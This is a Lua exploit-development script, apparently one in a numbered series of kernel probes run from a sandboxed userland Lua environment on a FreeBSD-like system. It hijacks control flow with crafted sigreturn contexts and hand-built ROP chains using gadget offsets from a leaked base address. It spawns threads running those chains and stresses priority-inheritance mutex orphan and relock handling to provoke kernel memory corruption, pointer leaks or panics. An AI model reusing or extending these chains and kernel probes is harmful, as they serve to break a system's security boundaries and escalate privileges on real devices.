-- CRASH_CLASS: MODERATE
-- PROBE 146f: PI chain accumulation stress test
--
-- 146e showed: clearing orphaned mutex owner to 0 lets re-lock succeed.
-- Double-lock from same thread returned 0 (unexpected — should be EDEADLK).
-- Mass orphan-relock accumulated PI chains without cleanup.
-- Test: stress the PI chain with many orphan cycles and threaded contention.
-- Look for: kernel memory corruption, leaked pointers, panics.

print("=== PROBE 146f: PI CHAIN STRESS ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc_thr = make_syscall(430)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = to_num(memory.read_dword(info + 0x108))
local ehi = to_num(memory.read_dword(info + 0x10C))

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
print("gpu=0x" .. string.format("%X%08X", gh, gl))

local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_wr      = uint64(string.format("0x%X%08X", ehi, elo + 0xD0B60))

-- Measure VM ops before stress
local vm0 = srop(624)
local vm0v = vm0 and to_num(vm0) or 0
print("vm_ops_before=" .. vm0v)

-- [A] Heavy PI chain accumulation: lock/clear/relock 50 times on same mutex
print("")
print("--- [A] 50x ORPHAN-RELOCK ---")
local mtx = gpu + 0x1000
local mtx_addr = uint64(string.format("0x%X%08X", gh, gl + 0x1000))
wd(mtx, 0)
wd(mtx + 4, 4) -- PI
for off = 8, 47, 4 do wd(mtx + off, 0) end

local relock_ok = 0
local relock_fail = 0
for cycle = 1, 50 do
    -- Lock
    local lr = srop(454, uint64(mtx_addr), uint64(5), uint64(0), uint64(0), uint64(0))
    if lr and to_num(lr) == 0 then
        -- Clear owner (orphan simulation)
        wd(mtx, 0)
        relock_ok = relock_ok + 1
    else
        relock_fail = relock_fail + 1
        -- break if lock fails
        if relock_fail > 3 then break end
    end
end
print("ok=" .. relock_ok .. " fail=" .. relock_fail)

-- Check VM ops growth
local vm1 = srop(624)
local vm1v = vm1 and to_num(vm1) or 0
print("vm_ops_after_50=" .. vm1v .. " delta=" .. (vm1v - vm0v))

-- [B] Threaded orphan: child locks, parent clears, child exits
-- This creates real kernel orphan state (not just userland simulation)
print("")
print("--- [B] THREADED ORPHAN x4 ---")

local orphan_results = {}
for tidx = 0, 3 do
    local tmtx = gpu + 0x2000 + tidx * 0x1000
    local tmtx_a = uint64(string.format("0x%X%08X", gh, gl + 0x2000 + tidx * 0x1000))
    wd(tmtx, 0)
    wd(tmtx + 4, 4)
    for off = 8, 47, 4 do wd(tmtx + off, 0) end

    local done = gpu + 0x10000 + tidx * 0x100
    wq(done, uint64(0))
    local done_a = uint64(string.format("0x%X%08X", gh, gl + 0x10000 + tidx * 0x100))

    local ts = gpu + 0x11000
    wq(ts, uint64(0))
    wq(ts + 8, uint64(50000000))
    local ts_a = uint64(string.format("0x%X%08X", gh, gl + 0x11000))

    -- Child ROP: sleep 50ms, lock mutex, write marker, thr_exit
    local rop = gpu + 0x20000 + tidx * 0x1000
    local rop_a = uint64(string.format("0x%X%08X", gh, gl + 0x20000 + tidx * 0x1000))
    local i = 0

    wq(rop+i, g_pop_rdi); i=i+8
    wq(rop+i, ts_a); i=i+8
    wq(rop+i, g_pop_rsi); i=i+8
    wq(rop+i, uint64(0)); i=i+8
    wq(rop+i, g_pop_rax); i=i+8
    wq(rop+i, uint64(240)); i=i+8
    wq(rop+i, sc_addr); i=i+8

    wq(rop+i, g_pop_rdi); i=i+8
    wq(rop+i, tmtx_a); i=i+8
    wq(rop+i, g_pop_rsi); i=i+8
    wq(rop+i, uint64(5)); i=i+8
    wq(rop+i, g_pop_rax); i=i+8
    wq(rop+i, uint64(454)); i=i+8
    wq(rop+i, sc_addr); i=i+8

    wq(rop+i, g_pop_rax); i=i+8
    wq(rop+i, uint64("0x00000000DEAD0001")); i=i+8
    wq(rop+i, g_pop_rdi); i=i+8
    wq(rop+i, done_a); i=i+8
    wq(rop+i, g_wr); i=i+8

    wq(rop+i, g_pop_rdi); i=i+8
    wq(rop+i, uint64(0)); i=i+8
    wq(rop+i, g_pop_rsi); i=i+8
    wq(rop+i, uint64(0)); i=i+8
    wq(rop+i, g_pop_rax); i=i+8
    wq(rop+i, uint64(431)); i=i+8
    wq(rop+i, sc_addr); i=i+8

    local tctx = gpu + 0x30000 + tidx * 0x1000
    for off = 0, 0x4FF, 4 do wd(tctx + off, 0) end
    pcall(function() return sc_gc(uint64(tctx)) end)
    wq(tctx + 0xE0, g_ret)
    wq(tctx + 0xF8, rop_a)
    wq(tctx + MC + 0x18, uint64(0))
    wq(tctx + MC + 0x50, uint64(0))
    wq(tctx + MC + 0x28, uint64(0))
    wq(tctx + MC + 0x30, uint64(0))

    local tbuf = gpu + 0x40000 + tidx * 0x100
    wq(tbuf, uint64(0))

    pcall(function()
        return sc_thr(uint64(tctx), uint64(tbuf), uint64(0))
    end)
end

-- Wait for all children
local tw = memory.alloc(16)
wq(tw, uint64(0))
wq(tw + 8, uint64(400000000))
pcall(function() make_syscall(240)(uint64(tw), uint64(0)) end)

-- Check orphan state
for tidx = 0, 3 do
    local tmtx = gpu + 0x2000 + tidx * 0x1000
    local done = gpu + 0x10000 + tidx * 0x100
    local owner = to_num(memory.read_dword(tmtx))
    local d = memory.read_qword(done)
    local _, dl = get_hi_lo(d)
    print("t" .. tidx .. ": owner=0x" .. string.format("%08X", owner) .. " done=0x" .. string.format("%08X", dl))

    -- Clear and re-lock
    wd(tmtx, 0)
    local tmtx_a = uint64(string.format("0x%X%08X", gh, gl + 0x2000 + tidx * 0x1000))
    local rl = srop(454, uint64(tmtx_a), uint64(5), uint64(0), uint64(0), uint64(0))
    local rv = rl and to_num(rl) or -999
    print("  relock=" .. rv .. " owner=0x" .. string.format("%08X", to_num(memory.read_dword(tmtx))))
    -- Unlock
    if rv == 0 then
        srop(454, uint64(tmtx_a), uint64(6), uint64(0), uint64(0), uint64(0))
    end
end

-- [C] Cross-mutex PI chain: lock mtxA, child locks mtxB+mtxA (contention on A)
-- then kill child → orphaned mtxB with PI dependency on mtxA
print("")
print("--- [C] CROSS-MUTEX PI ---")

local mA = gpu + 0x50000
local mA_a = uint64(string.format("0x%X%08X", gh, gl + 0x50000))
wd(mA, 0)
wd(mA + 4, 4)
for off = 8, 47, 4 do wd(mA + off, 0) end

local mB = gpu + 0x51000
local mB_a = uint64(string.format("0x%X%08X", gh, gl + 0x51000))
wd(mB, 0)
wd(mB + 4, 4)
for off = 8, 47, 4 do wd(mB + off, 0) end

-- Main locks A
local laA = srop(454, uint64(mA_a), uint64(5), uint64(0), uint64(0), uint64(0))
print("main_lockA=" .. (laA and tostring(to_num(laA)) or "nil"))
print("A_owner=0x" .. string.format("%08X", to_num(memory.read_dword(mA))))

-- Child: lock B, try lock A (will block since main holds it), then exit
-- But we don't want it to block forever, so child only does TRYLOCK on A
local cdone = gpu + 0x52000
wq(cdone, uint64(0))
local cdone_a = uint64(string.format("0x%X%08X", gh, gl + 0x52000))

local ts2 = gpu + 0x53000
wq(ts2, uint64(0))
wq(ts2 + 8, uint64(50000000))
local ts2_a = uint64(string.format("0x%X%08X", gh, gl + 0x53000))

local crop = gpu + 0x60000
local crop_a = uint64(string.format("0x%X%08X", gh, gl + 0x60000))
local ci = 0

-- sleep 50ms
wq(crop+ci, g_pop_rdi); ci=ci+8
wq(crop+ci, ts2_a); ci=ci+8
wq(crop+ci, g_pop_rsi); ci=ci+8
wq(crop+ci, uint64(0)); ci=ci+8
wq(crop+ci, g_pop_rax); ci=ci+8
wq(crop+ci, uint64(240)); ci=ci+8
wq(crop+ci, sc_addr); ci=ci+8

-- lock B
wq(crop+ci, g_pop_rdi); ci=ci+8
wq(crop+ci, mB_a); ci=ci+8
wq(crop+ci, g_pop_rsi); ci=ci+8
wq(crop+ci, uint64(5)); ci=ci+8
wq(crop+ci, g_pop_rax); ci=ci+8
wq(crop+ci, uint64(454)); ci=ci+8
wq(crop+ci, sc_addr); ci=ci+8

-- trylock A (non-blocking, will fail since main owns it)
wq(crop+ci, g_pop_rdi); ci=ci+8
wq(crop+ci, mA_a); ci=ci+8
wq(crop+ci, g_pop_rsi); ci=ci+8
wq(crop+ci, uint64(4)); ci=ci+8
wq(crop+ci, g_pop_rax); ci=ci+8
wq(crop+ci, uint64(454)); ci=ci+8
wq(crop+ci, sc_addr); ci=ci+8

-- write done marker
wq(crop+ci, g_pop_rax); ci=ci+8
wq(crop+ci, uint64("0x00000000BEEF0001")); ci=ci+8
wq(crop+ci, g_pop_rdi); ci=ci+8
wq(crop+ci, cdone_a); ci=ci+8
wq(crop+ci, g_wr); ci=ci+8

-- thr_exit
wq(crop+ci, g_pop_rdi); ci=ci+8
wq(crop+ci, uint64(0)); ci=ci+8
wq(crop+ci, g_pop_rsi); ci=ci+8
wq(crop+ci, uint64(0)); ci=ci+8
wq(crop+ci, g_pop_rax); ci=ci+8
wq(crop+ci, uint64(431)); ci=ci+8
wq(crop+ci, sc_addr); ci=ci+8

local cctx = gpu + 0x70000
for off = 0, 0x4FF, 4 do wd(cctx + off, 0) end
pcall(function() return sc_gc(uint64(cctx)) end)
wq(cctx + 0xE0, g_ret)
wq(cctx + 0xF8, crop_a)
wq(cctx + MC + 0x18, uint64(0))
wq(cctx + MC + 0x50, uint64(0))
wq(cctx + MC + 0x28, uint64(0))
wq(cctx + MC + 0x30, uint64(0))

local ctbuf = gpu + 0x80000
wq(ctbuf, uint64(0))
pcall(function() return sc_thr(uint64(cctx), uint64(ctbuf), uint64(0)) end)

-- Wait
wq(tw, uint64(0))
wq(tw + 8, uint64(300000000))
pcall(function() make_syscall(240)(uint64(tw), uint64(0)) end)

local cd = memory.read_qword(cdone)
local _, cdl = get_hi_lo(cd)
print("child_done=0x" .. string.format("%08X", cdl))
print("B_owner=0x" .. string.format("%08X", to_num(memory.read_dword(mB))))
print("A_owner=0x" .. string.format("%08X", to_num(memory.read_dword(mA))))

-- Unlock A from main
srop(454, uint64(mA_a), uint64(6), uint64(0), uint64(0), uint64(0))
print("A_after_unlock=0x" .. string.format("%08X", to_num(memory.read_dword(mA))))

-- Now B is orphaned. Clear and re-lock B
wd(mB, 0)
local rlB = srop(454, uint64(mB_a), uint64(5), uint64(0), uint64(0), uint64(0))
print("relock_B=" .. (rlB and tostring(to_num(rlB)) or "nil"))
print("B_new_owner=0x" .. string.format("%08X", to_num(memory.read_dword(mB))))

-- Scan the orphan mutex B's full structure for leaked data
print("B struct:")
for off = 0, 47, 4 do
    local v = to_num(memory.read_dword(mB + off))
    if v ~= 0 then
        print("  +" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", v))
    end
end

-- Final VM ops
local vm2 = srop(624)
local vm2v = vm2 and to_num(vm2) or 0
print("")
print("vm_ops_final=" .. vm2v .. " total_delta=" .. (vm2v - vm0v))
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
